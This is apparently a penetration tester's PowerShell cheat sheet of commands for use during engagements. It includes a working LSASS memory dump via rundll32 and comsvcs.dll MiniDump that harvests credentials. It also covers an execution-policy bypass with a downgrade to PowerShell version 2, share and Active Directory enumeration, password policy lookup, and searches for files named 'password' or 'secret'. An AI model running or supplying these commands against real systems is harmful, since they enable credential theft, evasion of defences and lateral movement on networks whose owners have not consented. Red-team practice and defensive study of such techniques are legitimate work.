# Powershell_stuff

#Check if Full or Constrained Language Mode is in place.   
$ExecutionContext.SessionState.LanguageMode

Useful set of Powershell related commands during engagements

	$processes = Get-Process
	$location = Get-Location

	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
		Write-Host "Found l s a s s process with ID $dumpid - starting dump with rundll32"
		Write-Host "Dumpfile goes to Get-Location\$env:COMPUTERNAME.log"
			rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $location\$env:COMPUTERNAME.log full | Out-Null
		Compress-Archive -Path $location\$env:COMPUTERNAME.log -DestinationPath $location\$env:COMPUTERNAME.zip -CompressionLevel NoCompression

#ENABLE TLS1.2 if you receive a message Regarding an ISSUE with TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

Execute Powershell with Exec bypass and stay in Version 2

powershell.exe -Version 2 -ExecutionPolicy bypass

#Powershell Specific Tooling

# PowerSharpPack
PowerSharpPack -SharpShares -Command "--shares"

#Domain Enumeration

#Group Membership  
([ADSISEARCHER]"samaccountname=$('ENTERUSERNAME')").Findone().Properties.memberof -replace '^CN=([^,]+).+$','$1' | sort-object


#Aliases

dir = Get-ChildItem


#Current Domain Password Policy
$domain = [adsi](“WinNT://DOMAIN.local”)
$domain.Properties.Keys | Foreach {
  @{$_ = [string]$domain.Properties.Item($_) }
}



#Search for any file with the extension (.doc, .xls, .pdf) export output to 'files.csv'

get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(‘*.doc*’,’*.xls*’,’*.pdf’)|where{!$_.PSIsContainer}|select-object FullName,@{Name=’Owner’;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv


#Or if you wanted to do several wildcard searches for sensitive files (replace the terms as necessary):

get-childitem .\ -rec -ErrorAction SilentlyContinue -include @(‘*password*’,’*sensitive*’,’*secret*’)|where{!$_.PSIsContainer}|select-object FullName,@{Name=’Owner’;Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,Length|export-csv -notypeinformation -path files.csv

